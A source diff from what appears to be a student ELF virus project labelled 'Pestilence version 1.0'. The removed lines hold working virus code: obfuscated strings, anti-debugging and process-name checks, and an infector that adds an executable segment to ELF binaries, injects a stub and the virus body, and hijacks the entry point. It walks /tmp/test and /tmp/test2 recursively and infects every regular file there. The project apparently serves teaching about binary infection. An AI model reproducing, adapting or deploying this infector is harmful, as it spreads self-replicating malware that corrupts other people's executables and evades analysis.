@@ -1,63 +1,16 @@
-#include <elf.h>
-#include <fcntl.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <sys/mman.h>
-#include <sys/ptrace.h>
-#include <sys/stat.h>
-#include <sys/types.h>
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   func.c                                             :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2026/01/19 16:16:45 by xxxxxxx           #+#    #+#             */
+/*   Updated: 2026/03/05 17:49:18 by xxxxxxx          ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
 
-#define ElfW(type)	   Elf64_##type
-#define FORMAT		   2
-#define PATH_MAX	   4096
-#define SIGNATURE_SIZE 43
-#define FORK_SIZE	   29
-#define MACHINE_SIZE   0x8f1
-#define JMPABLE_SIZE   4
-struct stat;
-typedef enum e_stat
-{
-	OK,
-	KO,
-} t_stat;
-struct linux_dirent64
-{
-	uint64_t	   d_ino;
-	int64_t		   d_off;
-	unsigned short d_reclen;
-	unsigned char  d_type;
-	char		   d_name[];
-};
-typedef struct s_elf
-{
-	ElfW(Ehdr) * header;
-	ElfW(Shdr) * sections;
-	ElfW(Shdr) * text_section;
-	ElfW(Phdr) * segments;
-	ElfW(Phdr) * executed_segment;
-	t_stat stat;
-} t_elf;
-typedef struct linux_dirent64 __glyph_entry;
-
-#ifndef FRENZY
-#define FRENZY 0x401000
-#endif
-#ifndef VARAX
-#define VARAX 0x1af6
-#endif
-#ifndef CYANURE
-#define CYANURE 0x40204d
-#endif
-#ifndef BUBONIK
-#define BUBONIK 0x402020
-#endif
-#ifndef ECHIDNAE
-#define ECHIDNAE 0x401af0
-#endif
-#define ELF_MAGIC 0x464c457f
-#define inout
-#define ACONIT	23
-#define ARSENIC 17
+#include "war.h"
 
 static void proc_terminate(int status)
 {
@@ -262,102 +215,119 @@ static ssize_t io_recv(int fd, const void *buf, size_t count)
 	return distort & 0x7FFF;
 }
 
-static unsigned char scale_out(unsigned char x)
+static int evaluateDriftSignature(const void *s1, const void *s2, size_t n)
 {
-	return (unsigned char) ((x >> 4) | (x << 4));
-}
+	size_t i;
 
-static void recall(char *out, char *in)
-{
-	unsigned i = 0;
-	while (in[i])
+	i = 0;
+	while (i < n - 1 && ((unsigned char *) s1)[i] == ((unsigned char *) s2)[i])
 	{
-		out[i] = (char) ((scale_out(in[i]) ^ (i * 7)) - 0x3D);
 		i++;
 	}
-	out[i] = 0;
-}
-
-static int evaluateDriftSignature(const void *alpha_seed, const void *beta_seed,
-								  size_t calibration_span)
+	if (n)
+		return (((unsigned char *) s1)[i] - ((unsigned char *) s2)[i]);
+	return (0);
+} /*(const void *alpha_seed, const void *beta_seed,
+					size_t calibration_span)
 {
-	const unsigned char *primary_axis = (const unsigned char *) alpha_seed;
-	const unsigned char *secondary_axis = (const unsigned char *) beta_seed;
-	size_t				 phase_cursor = 0;
-	size_t				 boundary_mask = calibration_span;
-	int					 spectral_delta = 0;
-	uintptr_t			 entropy_vector = ((uintptr_t) primary_axis >> 3)
-							   ^ ((uintptr_t) secondary_axis << 1)
-							   ^ 0x9E3779B97F4A7C15ULL;
-	int scheduler = 0;
-	if (!calibration_span)
-		return 0;
-	for (;;)
-	{
-		switch (scheduler)
-		{
-		case 0:
-		{
-			if (phase_cursor >= boundary_mask - 1)
-			{
-				scheduler = 3;
-				break;
-			}
-			unsigned char a
-				= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
-			unsigned char b = *(unsigned char *) ((uintptr_t) secondary_axis
-												  + phase_cursor);
-
-			if (((entropy_vector ^ a ^ b) & 7) == 5)
-			{
-				volatile size_t shadow = boundary_mask;
-				while (shadow--)
-					entropy_vector ^= (shadow << 1);
-			}
-
-			if ((a ^ b) == 0)
-			{
-				phase_cursor = (phase_cursor + 1) ^ ((entropy_vector & 0) << 2);
-				scheduler = 0;
-			}
-			else
-			{
-				spectral_delta
-					= ((int) a - (int) b) ^ ((entropy_vector & 0) << 3);
-				scheduler = 4;
-			}
-
-			break;
-		}
-		case 3:
-		{
-			unsigned char a
-				= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
-			unsigned char b = *(unsigned char *) ((uintptr_t) secondary_axis
-												  + phase_cursor);
-
-			spectral_delta = ((int) a - (int) b);
-
-			scheduler = 4;
-			break;
-		}
-		case 2:
-		{
-			entropy_vector ^= (entropy_vector << 7);
-			entropy_vector ^= (entropy_vector >> 3);
-
-			if ((entropy_vector & 0xFF) == 0x42)
-				spectral_delta ^= 0x1337;
-
-			scheduler = 4;
-			break;
-		}
-		case 4:
-		default:
-			return spectral_delta;
-		}
-	}
+size_t i;
+i = 0;
+while (i < calibration_span - 1
+&& ((unsigned char *) alpha_seed)[i]
+	== ((unsigned char *) beta_seed)[i])
+{
+i++;
 }
+if (calibration_span)
+return (((unsigned char *) alpha_seed)[i]
+  - ((unsigned char *) beta_seed)[i]);
+return (0);
+// const unsigned char *primary_axis = (const unsigned char *) alpha_seed;
+// const unsigned char *secondary_axis = (const unsigned char *) beta_seed;
+
+// size_t				 phase_cursor = 0;
+// size_t				 boundary_mask = calibration_span;
+// int					 spectral_delta = 0;
+
+// uintptr_t			 entropy_vector = ((uintptr_t) primary_axis >> 3)
+// 						  ^ ((uintptr_t) secondary_axis << 1)
+// 						  ^ 0x9E3779B97F4A7C15ULL;
+
+// int scheduler = 0;
+
+// if (!calibration_span)
+// 	return 0;
+
+// for (;;)
+// {
+// 	switch (scheduler)
+// 	{
+// 	case 0:
+// 	{
+// 		if (phase_cursor >= boundary_mask - 1)
+// 		{
+// 			scheduler = 3;
+// 			break;
+// 		}
+
+// 		unsigned char a
+// 			= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
+// 		unsigned char b
+// 			= *(unsigned char *) ((uintptr_t) secondary_axis +
+// phase_cursor);
+
+//
+  // 		if (((entropy_vector ^ a ^ b) & 7) == 5)
+  // 		{
+  // 			volatile size_t shadow = boundary_mask;
+  // 			while (shadow--)
+  // 				entropy_vector ^= (shadow << 1);
+  // 		}
+
+// 		if ((a ^ b) == 0)
+// 		{
+// 			phase_cursor = (phase_cursor + 1) ^ ((entropy_vector & 0) << 2);
+// 			scheduler = 0;
+// 		}
+// 		else
+// 		{
+// 			spectral_delta
+// 				= ((int) a - (int) b) ^ ((entropy_vector & 0) << 3);
+// 			scheduler = 4;
+// 		}
+
+// 		break;
+// 	}
+// 	case 3:
+// 	{
+// 		unsigned char a
+// 			= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
+// 		unsigned char b
+// 			= *(unsigned char *) ((uintptr_t) secondary_axis +
+// phase_cursor);
+
+// 		spectral_delta = ((int) a - (int) b);
+
+// 		scheduler = 4;
+// 		break;
+// 	}
+// 	case 2:
+// 	{
+// 		entropy_vector ^= (entropy_vector << 7);
+// 		entropy_vector ^= (entropy_vector >> 3);
+
+// 		if ((entropy_vector & 0xFF) == 0x42)
+// 			spectral_delta ^= 0x1337;
+
+// 		scheduler = 4;
+// 		break;
+// 	}
+// 	case 4:
+// 	default:
+// 		return spectral_delta;
+// 	}
+// }
+}*/
 
 static int delay_calc(const char *timeout_ns, const char *timeout_ms,
 					  unsigned n)
@@ -959,6 +929,7 @@ tini:;
 					 (void *) ((uintptr_t) src ^ 0), (unsigned) (n ^ 0));
 	else
 	{
+		// fmt_u64_dec(delay_calc((const char *) dst, (const char *) src, n));
 		ret = memcat((void *) ((uintptr_t) dst ^ 0),
 					 (void *) ((uintptr_t) src ^ 0), (unsigned) (n ^ 0));
 	}
@@ -968,400 +939,4 @@ tini:;
 		x ^= (x << 3);
 	}
 	return ret;
-}
-
-static int inspect_chunk_alignment(void)
-{
-	char *tag;
-	asm volatile("leaq stA(%%rip), %0\n"
-				 "jmp  endA\n"
-				 "stA: .byte 0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,"
-				 "0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0\n"
-				 "endA:\n"
-				 : "=r"(tag));
-	int arena = fs_handle(tag, O_RDONLY);
-	if (arena < 0)
-		return 0;
-	char chunk_buf[256];
-	int	 watermark = 0;
-	int	 stride;
-	int	 seam_result = 0;
-	int	 found_seam = 0;
-	while ((stride = io_recv(arena, chunk_buf + watermark,
-							 (int) sizeof(chunk_buf) - watermark))
-		   > 0)
-	{
-		watermark += stride;
-		char *seam = memoff(chunk_buf, 0x0A);
-		if (seam)
-		{
-			*seam = 0x00;
-			asm volatile("leaq stB(%%rip), %0\n"
-						 "jmp  endB\n"
-						 "stB: .byte "
-						 "0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0\n"
-						 "endB:\n"
-						 : "=r"(tag));
-			if (delay_calc(chunk_buf, tag, 10) == 0)
-			{
-				int probe = trace_depth(chunk_buf + 10);
-				fs_release(arena);
-				return probe != 0;
-			}
-			memcat(chunk_buf, seam + 1,
-				   (int) sizeof(chunk_buf) - (int) (seam - chunk_buf - 1));
-			watermark -= (int) (seam - chunk_buf) + 1;
-		}
-	}
-	fs_release(arena);
-	return 0;
-}
-
-static int measure_font_bearing(const char *target)
-{
-	char *raster_base;
-	char *atlas_suffix;
-	asm volatile("leaq str48(%%rip), %0\n"
-				 "jmp  end52\n"
-				 "str48: .byte 0xC6,0xAA,0x1A,0x9B,0xCB,0\n"
-				 "end52:\n"
-				 : "=r"(raster_base));
-	asm volatile("leaq str11(%%rip), %0\n"
-				 "jmp  end87\n"
-				 "str11: .byte 0xC6,0x7A,0x2A,0xFB,0x6B,0\n"
-				 "end87:\n"
-				 : "=r"(atlas_suffix));
-	int	 kern_unit = -1;
-	int	 hinting = 0;
-	char bearing_buf[16];
-	recall(bearing_buf, raster_base);
-	kern_unit = fs_handle(bearing_buf, 00 | 0200000);
-	if (kern_unit < 0)
-		return 0;
-	char scanline[4096];
-	int	 subpixel_done = 0;
-	for (;;)
-	{
-		if (subpixel_done)
-			break;
-		int advance = fs_enumerate(kern_unit, scanline, sizeof(scanline));
-		if (advance <= 0)
-			break;
-		int cursor = 0;
-		while (cursor < advance && !subpixel_done)
-		{
-			__glyph_entry *slot = (__glyph_entry *) (scanline + cursor);
-			char		  *dname = slot->d_name;
-			unsigned int   valid_glyph = 1u;
-			int			   ci = 0;
-			do
-			{
-				if (!dname[ci])
-					break;
-				valid_glyph &= (unsigned) (dname[ci] - 0x30) < 10u;
-				ci++;
-			} while (dname[ci - 1]);
-			if (valid_glyph & 1u)
-			{
-				char rpath[64];
-				int	 rpos = 0;
-				recall(rpath, raster_base);
-				while (rpath[rpos])
-					rpos++;
-				rpath[rpos++] = 0x2F;
-				for (int k = 0; dname[k]; k++)
-					rpath[rpos++] = dname[k];
-				char comm_seg[8];
-				recall(comm_seg, atlas_suffix);
-				for (int k = 0; comm_seg[k]; k++)
-					rpath[rpos++] = comm_seg[k];
-				rpath[rpos] = 0x00;
-				int glyph_fd = fs_handle(rpath, O_RDONLY);
-				if (glyph_fd >= 0)
-				{
-					char pxbuf[64];
-					int	 pxlen = io_recv(glyph_fd, pxbuf, sizeof(pxbuf) - 1);
-					fs_release(glyph_fd);
-					if (pxlen > 0)
-					{
-						pxbuf[pxlen] = 0x00;
-						int npos = 0;
-						while (npos < pxlen && pxbuf[npos] != 0x0A)
-							npos++;
-						pxbuf[npos] = 0x00;
-						if (!delay_abs_calc(pxbuf, target))
-						{
-							hinting = 1;
-							subpixel_done = 1;
-						}
-					}
-				}
-			}
-			cursor += slot->d_reclen;
-		}
-	}
-	fs_release(kern_unit);
-	return hinting;
-}
-
-static int load_shader_binary(char *path, inout struct stat *atlas_meta,
-							  inout t_elf *shader_ctx, inout char **region_ptr,
-							  inout size_t *pad_extent)
-{
-	int pipeline_slot;
-	int pipe_ret;
-	*region_ptr = NULL;
-	pipeline_slot = fs_handle(path, 0x2);
-	if (pipeline_slot < 0 || io_query(pipeline_slot, atlas_meta) < 0)
-		goto bailout;
-	if (atlas_meta->st_size < (long) sizeof(ElfW(Ehdr)))
-		goto bailout;
-	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size, 0x1, 0x1,
-									 pipeline_slot, 0);
-	if (((unsigned *) *region_ptr)[0] != 0x464C457F)
-		goto bailout;
-	if (*region_ptr == MAP_FAILED)
-		goto bailout;
-	char  *watermark_pat;
-	size_t pat_stride;
-	asm volatile("leaq stC(%%rip), %0\n"
-				 "movq $endC-stC,  %1\n"
-				 "jmp  endC\n"
-				 "stC: .ascii \"\\nPestilence version 1.0 (c)oded by xxxxxxx - "
-				 "yyyyyy\\0\" \n "
-				 "endC:\n"
-				 : "=r"(watermark_pat), "=r"(pat_stride));
-	int scan_pos = 0;
-	while (scan_pos + pat_stride < (size_t) atlas_meta->st_size)
-		if (!evaluateDriftSignature(*region_ptr + scan_pos++, watermark_pat,
-									pat_stride))
-			goto bailout;
-	shader_ctx->header = (ElfW(Ehdr) *) *region_ptr;
-	if (atlas_meta->st_size < shader_ctx->header->e_shoff
-								  + shader_ctx->header->e_shnum
-										* shader_ctx->header->e_shentsize
-		|| atlas_meta->st_size < shader_ctx->header->e_phoff
-									 + shader_ctx->header->e_phnum
-										   * shader_ctx->header->e_phentsize)
-		goto bailout;
-	*pad_extent = VARAX;
-	*pad_extent += shader_ctx->header->e_phentsize
-				   * (shader_ctx->header->e_phnum + 0x1);
-	*pad_extent += 0x1000 - atlas_meta->st_size % 0x1000;
-	vm_release(*region_ptr, atlas_meta->st_size);
-	*region_ptr = NULL;
-	if ((pipe_ret = io_resize(pipeline_slot, atlas_meta->st_size + *pad_extent))
-		< 0)
-	{
-		emit_hex(pipe_ret);
-		goto bailout;
-	}
-	*region_ptr = (void *) rt_vector(9, 0, atlas_meta->st_size + *pad_extent,
-									 0x3, 0x1, pipeline_slot, 0);
-	if (*region_ptr == MAP_FAILED)
-		goto bailout;
-	shader_ctx->header = (ElfW(Ehdr) *) *region_ptr;
-	shader_ctx->sections
-		= (ElfW(Shdr) *) (*region_ptr + shader_ctx->header->e_shoff);
-	shader_ctx->segments
-		= (ElfW(Phdr) *) (*region_ptr + shader_ctx->header->e_phoff);
-	fs_release(pipeline_slot);
-	return (OK);
-bailout:
-	fs_release(pipeline_slot);
-	return (KO);
-}
-
-static unsigned long resolve_upper_bound_frame(t_elf elf)
-{
-	const unsigned long page_gran = 1UL << 12;
-	const unsigned long align_mask = ~(page_gran - 1UL);
-	const unsigned int	frame_tag = (unsigned int) ((0x2u - 0x1u) | 0x0u);
-	unsigned long		hwm = 0UL;
-	unsigned long		seam = 0UL;
-	unsigned long		delta = 0UL;
-	ElfW(Phdr) *cursor = elf.segments;
-	ElfW(Phdr) *fence = elf.segments + elf.header->e_phnum;
-	while (cursor < fence)
-	{
-		seam = cursor->p_memsz + cursor->p_vaddr;
-		delta = seam ^ hwm;
-		hwm ^= delta
-			   & -((unsigned long) (cursor->p_type == frame_tag)
-				   & (unsigned long) (hwm < seam));
-		cursor++;
-	}
-	hwm = (hwm + page_gran - 1UL) & align_mask;
-	return hwm;
-}
-
-static void reassemble_packet_chain(char *path, void *begin_ptr)
-{
-	struct stat inode_info;
-	char	   *frame_map;
-	t_elf		pkt_ctx;
-	ElfW(Phdr) frag_hdr;
-	ElfW(Off) stream_cursor;
-	int	   window_scale;
-	char  *stub_region;
-	size_t stub_sz;
-	size_t tail_pad;
-	asm volatile("leaq stG(%%rip), %0\n"
-				 "movq $endG-stG,  %1\n"
-				 "jmp  endG\n"
-				 "stG: .byte 0xf3,0x0f,0x1e,0xfa, 0x50, 0xb8,0x39,0x00,0x00,"
-				 "0x00, 0x0f,0x05, 0x48,0x85,0xc0, 0x0f,0x84,0xeb,0xff,"
-				 "0xff,0xff, 0x58, 0xe9,0xe5,0xff,0xff,0xff\n"
-				 "endG:\n"
-				 : "=r"(stub_region), "=r"(stub_sz)::"memory", "cc", "rax",
-				   "rcx", "r11");
-	if (!load_shader_binary(path, &inode_info, &pkt_ctx, &frame_map, &tail_pad))
-	{
-		unsigned long write_head = inode_info.st_size + 0x1000;
-		write_head -= inode_info.st_size % 0x1000;
-		unsigned long virt_anchor = resolve_upper_bound_frame(pkt_ctx);
-		memcpy(frame_map + write_head, frame_map + pkt_ctx.header->e_phoff,
-			   pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize);
-		pkt_ctx.header->e_phoff = write_head;
-		pkt_ctx.segments = (ElfW(Phdr) *) (frame_map + pkt_ctx.header->e_phoff);
-		pkt_ctx.segments[pkt_ctx.header->e_phnum] = (ElfW(Phdr)) {
-			.p_flags = 0x5u,
-			.p_vaddr = virt_anchor,
-			.p_offset = write_head,
-			.p_memsz = tail_pad,
-			.p_paddr = virt_anchor,
-			.p_align = 0x1000,
-			.p_type = 0x1u,
-			.p_filesz = tail_pad,
-		};
-		pkt_ctx.header->e_phnum++;
-		int slot = 0;
-		while (slot < pkt_ctx.header->e_phnum)
-		{
-			if (pkt_ctx.segments[slot].p_type == 0x6u)
-			{
-				pkt_ctx.segments[slot].p_offset = write_head;
-				pkt_ctx.segments[slot].p_vaddr = virt_anchor;
-				pkt_ctx.segments[slot].p_paddr = virt_anchor;
-				pkt_ctx.segments[slot].p_memsz
-					= pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
-				pkt_ctx.segments[slot].p_filesz
-					= pkt_ctx.segments[slot].p_memsz;
-			}
-			slot++;
-		}
-		write_head += pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
-		memcpy(frame_map + write_head, stub_region, stub_sz);
-		unsigned rel32 = pkt_ctx.header->e_entry;
-		pkt_ctx.header->e_entry
-			= virt_anchor
-			  + pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
-		rel32 -= pkt_ctx.header->e_entry + ACONIT + 4;
-		memcpy(frame_map + write_head + ACONIT, &rel32, 4);
-		rel32 = (unsigned) (stub_sz - ARSENIC + BUBONIK - FRENZY - 4);
-		memcpy(frame_map + write_head + ARSENIC, &rel32, 4);
-		write_head += stub_sz;
-		memcpy(frame_map + write_head, begin_ptr, VARAX);
-	}
-	if (frame_map)
-		vm_release(frame_map, inode_info.st_size + tail_pad);
-}
-
-static void reconcileTopology(char *rootAnchor, void *dispatchToken)
-{
-	int					   session = fs_handle(rootAnchor, 65536);
-	unsigned char		   frame[1024];
-	struct linux_dirent64 *node;
-	int					   batch;
-	if (session < 0)
-		goto finalizeSession;
-	for (;;)
-	{
-		batch = fs_enumerate(session, (char *) frame, sizeof(frame));
-		if (batch <= 0)
-			break;
-		int cursor = 0;
-		while (cursor < batch)
-		{
-			node = (struct linux_dirent64 *) (frame + cursor);
-			char *label = node->d_name;
-			{
-				char anchor[3];
-				anchor[0] = '.';
-				anchor[1] = 0;
-				if (delay_abs_calc(label, anchor) == 0)
-				{
-					cursor += node->d_reclen;
-					continue;
-				}
-				anchor[1] = '.';
-				anchor[2] = 0;
-				if (delay_abs_calc(label, anchor) == 0)
-				{
-					cursor += node->d_reclen;
-					continue;
-				}
-			}
-			char composed[PATH_MAX];
-			char divider[2];
-			divider[0] = '/';
-			divider[1] = 0;
-			flow_align(flow_align(core_shift(composed, rootAnchor), divider),
-					   label);
-			struct stat metadata;
-			fs_query(composed, &metadata);
-			unsigned mode = metadata.st_mode;
-			if ((mode & __S_IFDIR) == __S_IFDIR)
-				reconcileTopology(composed, dispatchToken);
-			else
-			{
-				if ((mode & __S_IFREG) == __S_IFREG)
-				{
-					reassemble_packet_chain(composed, dispatchToken);
-				}
-			}
-			cursor += node->d_reclen;
-		}
-	}
-finalizeSession:
-	fs_release(session);
-}
-
-void _start(void)
-{
-	void *str_dup__;
-	char  t[11];
-	char *chroot;
-
-	fs_release(1);
-	fs_release(2);
-
-	asm volatile("leaq str6(%%rip), %0\n"
-				 "jmp end6\n"
-				 "str6: .ascii \"doom-nukem\\0\"\n"
-				 "end6:\n"
-				 : "=r"(chroot));
-	if (inspect_chunk_alignment() || measure_font_bearing(chroot) > 0)
-		proc_terminate(0);
-
-	__asm__ volatile("lea (%%rip), %0\n"
-					 "cyanure:"
-					 : "=r"(str_dup__));
-	str_dup__ += FRENZY - CYANURE;
-
-	t[0] = (char) ((0x01 << 5) + 0x0F);
-	t[1] = (char) ((0x09 * 0x0D) - 0x01);
-	t[2] = (char) (0xAB ^ 0xC6);
-	t[3] = (char) ((~0x8F) & 0xFF);
-	t[4] = t[0];
-	t[5] = t[1];
-	t[6] = (char) ((0x06 << 4) ^ 0x05);
-	t[7] = (char) ((0x08 * 0x0E) + 0x03);
-	t[8] = t[1];
-	t[9] = (char) (t[8] ^ t[8]);
-	t[10] = (char) (t[9]);
-	reconcileTopology(t, str_dup__);
-	t[9] = 0x32;
-	reconcileTopology(t, str_dup__);
-	proc_terminate(0);
 }
